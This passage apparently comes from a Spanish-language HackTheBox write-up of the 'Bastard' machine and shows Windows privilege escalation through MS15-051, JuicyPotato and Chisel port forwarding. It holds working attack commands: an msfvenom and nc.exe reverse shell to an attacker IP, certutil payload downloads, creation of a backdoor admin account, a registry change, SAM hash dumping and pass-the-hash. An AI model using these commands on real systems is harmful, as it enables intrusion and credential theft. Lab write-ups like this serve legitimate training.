-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;10.10.14.13&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;mbFolder&lt;span class=&quot;se&quot;&gt;\m&lt;/span&gt;s15-051x64.exe &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;10.10.14.13&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;mbFolder&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;ev.exe&quot;&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Obtenemos una sesión con permisos de administrador.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#OUTPUT&lt;/span&gt;
-&lt;span class=&quot;nb&quot;&gt;whoami
-&lt;/span&gt;nt authority&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;ystem
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h2 id=&quot;escalada-juicypotato&quot;&gt;ESCALADA JUICYPOTATO&lt;/h2&gt;
-
-&lt;p&gt;Esta es otra manera de escalar privilegios, en esta ocasión vamos a hacer uso de &lt;a href=&quot;https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe&quot;&gt;JuicyPotato&lt;/a&gt;, debido a que tenemos habilitado el permiso &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SeImpersonatePrivilege&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;En máquina víctima consultamos permisos y grupos habilitados.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;whoami&lt;/span&gt; /priv
-PRIVILEGES INFORMATION
-&lt;span class=&quot;nt&quot;&gt;----------------------&lt;/span&gt;
-
-Privilege Name          Description                               State  
-&lt;span class=&quot;o&quot;&gt;=======================&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=========================================&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=======&lt;/span&gt;
-SeImpersonatePrivilege  Impersonate a client after authentication Enabled
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Descargamos &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;JuicyPotato&lt;/code&gt;&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;wget https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Habilitamos un servidor &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http&lt;/code&gt; por python&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;python3 &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; http.server 80
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Descargamos en la máquina el recurso a explotar&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;certutil.exe &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-urlcache&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-split&lt;/span&gt; http://10.10.14.2/JuicyPotato.exe JuicyPotato.exe
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h3 id=&quot;msfvenom-reverse-shell&quot;&gt;MSFVENOM REVERSE SHELL&lt;/h3&gt;
-
-&lt;p&gt;Generamos reverse shell con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;msfvenom&lt;/code&gt;&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msfvenom &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; windows/shell_reverse_tcp &lt;span class=&quot;nv&quot;&gt;LHOST&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;10.10.14.2 &lt;span class=&quot;nv&quot;&gt;LPORT&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;4565 &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; exe &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; rev.exe
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Descargamos la reverse shell en la máquina víctima&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;certutil.exe &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-urlcache&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-split&lt;/span&gt; http://10.10.14.2/rev.exe
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Generamos un listener&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;rlwrap nc &lt;span class=&quot;nt&quot;&gt;-lvnp&lt;/span&gt; 4564
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Ejecutamos &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;JuicyPotato&lt;/code&gt; activando la reverse shell desde la máquina víctima&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;JuicyPotato.exe &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; 1231 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; C:&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\S&lt;/span&gt;ystem32&lt;span class=&quot;se&quot;&gt;\c&lt;/span&gt;md.exe &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;/c C:&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;indows&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\T&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;emp&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\p&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;riv&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;ev.exe&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;9B1F122C-2982-4e91-AA8B-E071D54F2A4D&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;&lt;em&gt;NOTA: Identifica el sistema operativo con systeminfo para obtener el CLSID&lt;/em&gt;&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;whoami      
-&lt;/span&gt;nt authority&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;ystem
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h3 id=&quot;ncexe-reverse-shell&quot;&gt;NC.EXE REVERSE SHELL&lt;/h3&gt;
-
-&lt;p&gt;Ahora vamos a escalar descargando &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nc.exe&lt;/code&gt; con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;certutil&lt;/code&gt; y ejecutar comandos privilegiados con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;JuicyPotato.exe&lt;/code&gt;.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;certutil.exe &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-urlcache&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-split&lt;/span&gt; http://10.10.14.2/nc.exe
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Generamos un listener&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;rlwrap nc &lt;span class=&quot;nt&quot;&gt;-lvnp&lt;/span&gt; 4564
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Ejecutamos &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;JuicyPotato&lt;/code&gt; activando la reverse shell desde la máquina víctima&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;JuicyPotato.exe &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; 1231 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; C:&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\S&lt;/span&gt;ystem32&lt;span class=&quot;se&quot;&gt;\c&lt;/span&gt;md.exe &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;/c C:&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;indows&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\T&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;emp&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\p&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;riv&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;c.exe -e cmd.exe 10.10.14.2 4566&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;9B1F122C-2982-4e91-AA8B-E071D54F2A4D&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;&lt;em&gt;NOTA: Identifica el sistema operativo con systeminfo para obtener el CLSID&lt;/em&gt;&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#OUTPUT&lt;/span&gt;
-&lt;span class=&quot;nb&quot;&gt;whoami
-&lt;/span&gt;nt authority&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;ystem
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h2 id=&quot;escalada-por-chisel&quot;&gt;ESCALADA POR CHISEL&lt;/h2&gt;
-
-&lt;p&gt;Para este último ejercicio de escalada de privilegios vamos a crear un &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;port forwarding&lt;/code&gt; por medio de la herramienta &lt;a href=&quot;https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_windows_amd64.gz&quot;&gt;chisel&lt;/a&gt;, para luego crear un usuario y asignarle privilegios, para obtener por medio de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cme&lt;/code&gt; y &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;wmicexec.py&lt;/code&gt; una consola interactiva con un usuario administrador.&lt;/p&gt;
-
-&lt;p&gt;Verificamos si el puerto &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;445&lt;/code&gt; se encuentra habilitado en la máquina víctima.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;netstat &lt;span class=&quot;nt&quot;&gt;-nat&lt;/span&gt;
-
-Active Connections
-
-  Proto  Local Address          Foreign Address        State           Offload State
-  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       InHost      
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Descargamos y descomprimimos &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;chisel.exe&lt;/code&gt;&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;wget https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_windows_amd64.gz
-&lt;span class=&quot;nb&quot;&gt;gunzip &lt;/span&gt;chisel_1.7.7_windows_amd64.gz
-&lt;span class=&quot;nb&quot;&gt;mv &lt;/span&gt;chisel_1.7.7_windows_amd64 chisel.exe
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Nos ubicamos en la carpeta donde vamos a descargar &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;chisel.exe&lt;/code&gt; en la máquina víctima&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;C:&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\T&lt;/span&gt;emp&lt;span class=&quot;se&quot;&gt;\p&lt;/span&gt;riv
-certutil.exe &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-urlcache&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-split&lt;/span&gt; http://10.10.14.2/chisel.exe chisel.exe
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Descargamos &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;chisel&lt;/code&gt; para nuestra máquina atacante&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;wget https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_linux_amd64.gz
-&lt;span class=&quot;nb&quot;&gt;mv &lt;/span&gt;chisel_1.7.7_linux_amd64 chisel
-&lt;span class=&quot;nb&quot;&gt;chmod&lt;/span&gt; +x chisel
-upx chisel
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Ejecutamos &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;chisel&lt;/code&gt; en la máquina atacante&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; ./chisel server &lt;span class=&quot;nt&quot;&gt;--reverse&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; 1234
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Ejecutamos &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;chisel&lt;/code&gt; en la máquina víctima, generando un &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;port forwarding&lt;/code&gt; del puerto &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;445&lt;/code&gt;&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;chisel.exe client 10.10.14.2:1234 R:445:127.0.0.1:445
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Ganamos acceso nuevamente y con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;JuicyPotato&lt;/code&gt; creamos un usuario en la máquina víctima&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;jp.exe &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; 1337 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; C:&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\S&lt;/span&gt;ystem32&lt;span class=&quot;se&quot;&gt;\c&lt;/span&gt;md.exe &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;/c net user bastiant1c bast1ant1c! /add&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;{e60687f7-01a1-40aa-86ac-db1cbf673334}&quot;&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Verificamos la creación del usuario&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;net user
-User accounts &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;
-
-&lt;span class=&quot;nt&quot;&gt;-------------------------------------------------------------------------------&lt;/span&gt;
-Administrator            bastiant1c               dimitris                 
-Guest
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Agregamos el usuario al grupo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Administrators&lt;/code&gt;&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;jp.exe &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; 1337 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; C:&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\S&lt;/span&gt;ystem32&lt;span class=&quot;se&quot;&gt;\c&lt;/span&gt;md.exe &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;/c net localgroup Administrators bastiant1c /add&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;{e60687f7-01a1-40aa-86ac-db1cbf673334}&quot;&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Creamos el recurso compartido &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;attacker&lt;/code&gt; con permisos de administración&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;jp.exe &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; 1337 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; C:&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\S&lt;/span&gt;ystem32&lt;span class=&quot;se&quot;&gt;\c&lt;/span&gt;md.exe &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;/c net share attacker=C:&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;indows&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\T&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;emp /GRANT:Administrators,FULL&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;{e60687f7-01a1-40aa-86ac-db1cbf673334}&quot;&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Modificamos el registro para obtener permisos especiales y poder ganar acceso&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;jp.exe &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; 1337 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; C:&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\S&lt;/span&gt;ystem32&lt;span class=&quot;se&quot;&gt;\c&lt;/span&gt;md.exe &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;/c reg add HKLM&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\S&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;oftware&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\M&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;icrosoft&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;indows&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\C&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;urrentVersion&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\P&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;olicies&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\S&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;ystem /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;{e60687f7-01a1-40aa-86ac-db1cbf673334}&quot;&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Ejecutamos &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cme&lt;/code&gt; para verificar si tenemos un &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Pwn3d!&lt;/code&gt; en los resultados&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;cme smb 127.0.0.1 &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'bastiant1c'&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'bast1ant1c!'&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#OUTPUT&lt;/span&gt;
-SMB         127.0.0.1       445    BASTARD          &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Windows Server 2008 R2 Datacenter 7600 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;name:BASTARD&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;domain:Bastard&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;signing:False&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;SMBv1:True&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-SMB         127.0.0.1       445    BASTARD          &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Bastard&lt;span class=&quot;se&quot;&gt;\b&lt;/span&gt;astiant1c:bast1ant1c! &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Pwn3d!&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Dumpeamos los hashes de los usuarios de la máquina víctima&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;cme smb 127.0.0.1 &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'bastiant1c'&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'bast1ant1c!'&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--sam&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#OUTPUT&lt;/span&gt;
-SMB         127.0.0.1       445    BASTARD          &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Dumping SAM hashes
-SMB         127.0.0.1       445    BASTARD          Administrator:500:aad3b435b51404eeaad3b435b51404ee:d3c87620c26302e9f04a756e3301e63a:::
-SMB         127.0.0.1       445    BASTARD          Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
-SMB         127.0.0.1       445    BASTARD          dimitris:1004:aad3b435b51404eeaad3b435b51404ee:57544bb8930967eee7f44d46f8bfe59d:::
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Ejecutamos &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;wmiexec.py&lt;/code&gt; para acceder a una consola interactiva como el usuario Administrator&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;wmiexec.py WORGROUP/Administrator@10.10.10.9 &lt;span class=&quot;nt&quot;&gt;-hashes&lt;/span&gt; :d3c87620c26302e9f04a756e3301e63a
